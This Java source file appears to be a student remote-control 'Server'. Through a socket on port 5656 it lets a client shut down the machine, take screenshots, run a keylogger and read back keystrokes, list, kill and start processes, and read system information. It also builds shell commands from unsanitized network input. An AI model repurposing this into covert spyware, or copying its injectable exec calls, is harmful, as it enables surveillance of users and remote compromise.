package server;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.net.Socket;
import java.net.ServerSocket;
import javax.swing.JOptionPane;
import java.io.*;
import java.nio.ByteBuffer;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;

import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.util.Scanner;

public class Server extends javax.swing.JFrame implements NativeKeyListener{
    public static ServerSocket serverSocket;
    public static Socket socket;
    public static DataInputStream in;
    public static DataOutputStream out;
    public static Keylogger key = null;
    public static boolean hook_flag = false;
    public static boolean isRun = false;
    SendScreen send = null;
    
    public Server() {
        initComponents();
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        serverLabel = new javax.swing.JLabel();
        jSeparator1 = new javax.swing.JSeparator();
        openButton = new javax.swing.JButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        serverLabel.setFont(new java.awt.Font("Segoe UI", 1, 24)); // NOI18N
        serverLabel.setText("Server");

        openButton.setFont(new java.awt.Font("Segoe UI", 1, 14)); // NOI18N
        openButton.setText("Open Connect");
        openButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                openButtonActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(jSeparator1))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(89, 89, 89)
                        .addComponent(serverLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 75, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(0, 102, Short.MAX_VALUE)))
                .addContainerGap())
            .addGroup(layout.createSequentialGroup()
                .addGap(61, 61, 61)
                .addComponent(openButton)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(serverLabel)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jSeparator1, javax.swing.GroupLayout.PREFERRED_SIZE, 10, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(30, 30, 30)
                .addComponent(openButton, javax.swing.GroupLayout.PREFERRED_SIZE, 79, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(51, Short.MAX_VALUE))
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void getInfo() throws IOException
    {
        String res = "";
        
        res+=System.getProperty("os.name");
        res +=",";
        
        res+=System.getProperty("os.version");
        res +=",";
        
        res+=System.getProperty("os.arch");
        res +=",";
        
        /* Total number of processors or cores available to the JVM */
        res += Long.toString(Runtime.getRuntime().availableProcessors());
        res +=",";
        /* Total amount of free memory available to the JVM */
        res += Long.toString(Runtime.getRuntime().freeMemory());
        res +=","; 
        /* Total memory currently available to the JVM */
        res+= Long.toString(Runtime.getRuntime().totalMemory());
        res +=",";

        /* Lay danh sach tat ca file he thong: C:\, D:\, E:\,.. */
        File[] roots = File.listRoots();
        /* In thong tin tung o */
        for (File root : roots) {
            System.out.println("File system root: " + root.getAbsolutePath());
            res+=root.getAbsolutePath();
            res+=",";
        
            System.out.println("Total space (bytes): " + root.getTotalSpace());
            res+= Long.toString(root.getTotalSpace());
            res+=",";
            System.out.println("Free space (bytes): " + root.getFreeSpace());
            res+= Long.toString(root.getFreeSpace());
            res+=",";
            System.out.println("Usable space (bytes): " + root.getFreeSpace());
            res+= Long.toString(root.getFreeSpace());
            res+=",";  
        }
        res+="end";
        DataOutputStream toClient = new DataOutputStream(socket.getOutputStream());
        toClient.writeUTF(res);
        toClient.flush();
    }
    private void shutdown()throws IOException
    {
        Runtime runtime = Runtime.getRuntime();
        runtime.exec("shutdown -s -t 10");
    }
    private void restart() throws IOException
    {
         Runtime r = Runtime.getRuntime();
         r.exec("shutdown -r -t 5");
    }
    private void watch() throws IOException {
        try {
            Process p = Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"tasklist.exe /fo csv /nh");
            BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
            
            String line = "";

            while ((line = input.readLine()) != null) {
                try
                { 
                    DataOutputStream toClient = new DataOutputStream(socket.getOutputStream());
                    toClient.writeUTF(line);
                    toClient.flush();
                } 
                catch (IOException e) { e.printStackTrace(); }
            }
            DataOutputStream toClient = new DataOutputStream(socket.getOutputStream());
            toClient = new DataOutputStream(socket.getOutputStream());
            toClient.writeUTF("@@@");
            toClient.flush();
            input.close();
            
        } catch (Exception err) {
            err.printStackTrace();
        }
    }
    
    public static boolean isProcessRunning(String id) 
    {

            try {
                Process pro = Runtime.getRuntime().exec("tasklist");
                BufferedReader reader = new BufferedReader(new InputStreamReader(pro.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null)
                {
                        if(line.contains(id) || (line.toUpperCase()).contains(id)) {
                            return true;
                        }
                }

            } 
            catch (IOException e) 
            {
                e.printStackTrace();
            }

            return false;
    }
    
    public static boolean isProcessRunning_ByName(String name) 
    {

            try {
                Process pro = Runtime.getRuntime().exec("tasklist");
                BufferedReader reader = new BufferedReader(new InputStreamReader(pro.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null)
                {
                        if(line.contains(name)) {
                            return true;
                        }
                }

            } 
            catch (IOException e) 
            {
                e.printStackTrace();
            }

            return false;
    }
    
    private void kill() throws IOException {
        try {
            DataInputStream dataIn = new DataInputStream(socket.getInputStream());
            String id = dataIn.readUTF();
            System.out.println(id);
            String cmd = "taskkill /F /PID " + id;
            if(isProcessRunning(id) == true) {
                    Process kill = Runtime.getRuntime().exec(cmd);
                    DataOutputStream dataOut = new DataOutputStream(socket.getOutputStream());
                    dataOut.writeUTF("Yes");
                    dataOut.flush();
            }
            else {
                    Process kill = Runtime.getRuntime().exec(cmd);
                    DataOutputStream dataOut = new DataOutputStream(socket.getOutputStream());
                    dataOut.writeUTF("Not found");
                    dataOut.flush();
            }
        } catch(Exception e) {
            DataOutputStream dataOut = new DataOutputStream(socket.getOutputStream());
            dataOut.writeUTF("No");
            dataOut.flush();
            e.printStackTrace();
        }
    }
    
    private void start() throws IOException {
        try {
            DataInputStream nameIn = new DataInputStream(socket.getInputStream());
            String name = nameIn.readUTF();
            if(isProcessRunning_ByName(name) == false) {
                System.out.println(name);
                name = name + ".exe";
//                Process process = new ProcessBuilder(name).start();
                File dir = new File("C:/");
                Runtime.getRuntime().exec("cmd /c start " + name);
                DataOutputStream dataOut = new DataOutputStream(socket.getOutputStream());
                dataOut.writeUTF("Yes");
                dataOut.flush();
            }
            else {
                DataOutputStream dataOut = new DataOutputStream(socket.getOutputStream());
                dataOut.writeUTF("Running");
                dataOut.flush();
            }
        } catch(IOException o) {
            DataOutputStream data_out = new DataOutputStream(socket.getOutputStream());
            data_out.writeUTF("No");
            data_out.flush();
        }
    }
    
    public void watchApp() throws IOException {
        try {
            Process process = new ProcessBuilder("powershell","\"gps| ? {$_.mainwindowtitle.length -ne 0} | Format-Table -HideTableHeaders  name, ID").start();
            new Thread(() -> {
                Scanner sc = new Scanner(process.getInputStream());
                if (sc.hasNextLine()) sc.nextLine();
                while (sc.hasNextLine())
                {
                    String line = sc.nextLine();
                    System.out.println(line);

                    try 
                    { 
                        DataOutputStream toClient = new DataOutputStream(socket.getOutputStream());
                        toClient.writeUTF(line);
                        toClient.flush();
                    } 
                    catch (IOException e) { e.printStackTrace(); }

                } 
            }).start();
            process.waitFor();
            System.out.println("Done");
            DataOutputStream toClient = new DataOutputStream(socket.getOutputStream());
            toClient.writeUTF("@@@");
            toClient.flush();
        } catch (Exception err) {
            err.printStackTrace();
        }
    }
     
    private void killApp() throws IOException {
        try {
            DataInputStream dataIn = new DataInputStream(socket.getInputStream());
            String id = dataIn.readUTF();
            System.out.println(id);
            String cmd = "taskkill /F /PID " + id;
            if(isProcessRunning(id) == true) {
                    Process kill = Runtime.getRuntime().exec(cmd);
                    DataOutputStream dataOut = new DataOutputStream(socket.getOutputStream());
                    dataOut.writeUTF("Yes");
                    dataOut.flush();
            }
            else {
                    Process kill = Runtime.getRuntime().exec(cmd);
                    DataOutputStream dataOut = new DataOutputStream(socket.getOutputStream());
                    dataOut.writeUTF("Not found");
                    dataOut.flush();
            }
        } catch(Exception e) {
            DataOutputStream dataOut = new DataOutputStream(socket.getOutputStream());
            dataOut.writeUTF("No");
            dataOut.flush();
            e.printStackTrace();
        }
    }
    
    private void startApp() throws IOException {
        try {
            DataInputStream nameIn = new DataInputStream(socket.getInputStream());
            String name = nameIn.readUTF();
            if(isProcessRunning_ByName(name) == false) {
                System.out.println(name);
                name = name + ".exe";
//                Process process = new ProcessBuilder(name).start();
                File dir = new File("C:/");
                Runtime.getRuntime().exec("cmd /c start " + name);
                DataOutputStream dataOut = new DataOutputStream(socket.getOutputStream());
                dataOut.writeUTF("Yes");
                dataOut.flush();
            }
            else {
                DataOutputStream dataOut = new DataOutputStream(socket.getOutputStream());
                dataOut.writeUTF("Running");
                dataOut.flush();
            }
        } catch(IOException o) {
            DataOutputStream data_out = new DataOutputStream(socket.getOutputStream());
            data_out.writeUTF("No");
            data_out.flush();
        }
    }
    
    private void pic()
    {
        try {
            DataOutputStream output =  new DataOutputStream(socket.getOutputStream());
            Robot robot = new Robot();
            Rectangle rect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenshot = robot.createScreenCapture(rect);
            ImageIO.write(screenshot, "JPG", new File("D:/Screenshot_Server.jpg"));
            
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ImageIO.write(screenshot, "jpg", byteArrayOutputStream);
            
            byte[] size = ByteBuffer.allocate(4).putInt(byteArrayOutputStream.size()).array();
            output.write(size);
            output.write(byteArrayOutputStream.toByteArray());
            output.flush();

            //System.out.println("Flushed: " + System.currentTimeMillis());
            //Thread.sleep(120000);
            //System.out.println("Closing: " + System.currentTimeMillis());
	} 
        catch(Exception e)
        {
            JOptionPane.showMessageDialog(this, "Lỗi:\n" + e.getMessage());
            e.printStackTrace();
            return;
        }
    }
    
    private void keylog(String msg) throws IOException, NativeHookException
    {
        String res = "";
        
        if(msg.equals("Hook"))
        {
            if(isRun == false)
            {
                key = new Keylogger();
                key.run();
                isRun = true;
            }
            hook_flag = true;
            key.str = "";
            msg = "";
        }
        else if(msg.equals("Unhook"))
        {
            //key.stop();
            hook_flag = false;
        }
        else if(msg.equals("Printkey"))
        {
            if(hook_flag == false)
            {
                out = new DataOutputStream(socket.getOutputStream());
                out.writeUTF("Unhook");
                out.flush();
                return;
            }
            res = key.str;
            out = new DataOutputStream(socket.getOutputStream());
            out.writeUTF(res);
            out.flush();
            key.str = "";
            res = "";
        }
        else
        {
            System.out.println("Keylogger msg không hợp lệ");
            return;
        }
    }

    private void keepListening() throws IOException
    {
        if(socket!=null) socket.close();
        if(serverSocket!=null) serverSocket.close();

        serverSocket = new ServerSocket(5656);
        socket = serverSocket.accept();   
    }
    
    private void display(String msg) throws AWTException, IOException
    {
        if(msg.equals("Display"))
        {
            send = new SendScreen(socket); 
        }
        else
        {
            send.stop();
        }
    }
    private void openButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_openButtonActionPerformed
        try
        {
            serverSocket = new ServerSocket(5656);
            socket = serverSocket.accept();
        }
        catch(Exception e) {
            JOptionPane.showMessageDialog(this, "Lỗi mở server:\n" + e.getMessage());
            e.printStackTrace();
            return;
        }
        
        while(true)
        {
            try{
                in = new DataInputStream(socket.getInputStream());
                String message = in.readUTF();
                System.out.println("Client message: "+message);
                switch(message)
                {
                    case "Shutdown": shutdown(); break;
                
                    case "Restart": restart(); break;
                    
                    case "Pic": pic(); break;
                    
                    case "Hook": 
                    
                    case "Unhook": 
                    
                    case "Printkey": keylog(message); break;
                    
                    case "Watch": watch(); break;
                    
                    case "Kill": kill(); break;
                    
                    case "Start": start(); break;
                    
                    case "Watch App": watchApp(); break;
                    
                    case "Kill App": killApp(); break;
                    
                    case "Start App": startApp(); break;
                    
                    case "Info": getInfo(); break;
                    
                    case "Display": display(message); break;
                    
                    case "stop display": display(message); break;
                    
                    case "Exit": keepListening(); break;
                    
                    default: System.out.println("Message không xác định: " + message);
                    
                }
            }
            catch(Exception e)
            {
                JOptionPane.showMessageDialog(this, e.getMessage() +"\nKeep Listening...");
                Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, e);
                e.printStackTrace();
                try {
                    keepListening();
                } catch (IOException ex) {
                    Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        }
        
        
        
    }//GEN-LAST:event_openButtonActionPerformed

    public static void main(String args[]) {
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Server.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Server.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Server.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Server.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>
        //</editor-fold>
        //</editor-fold>
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new Server().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JSeparator jSeparator1;
    private javax.swing.JButton openButton;
    private javax.swing.JLabel serverLabel;
    // End of variables declaration//GEN-END:variables
}
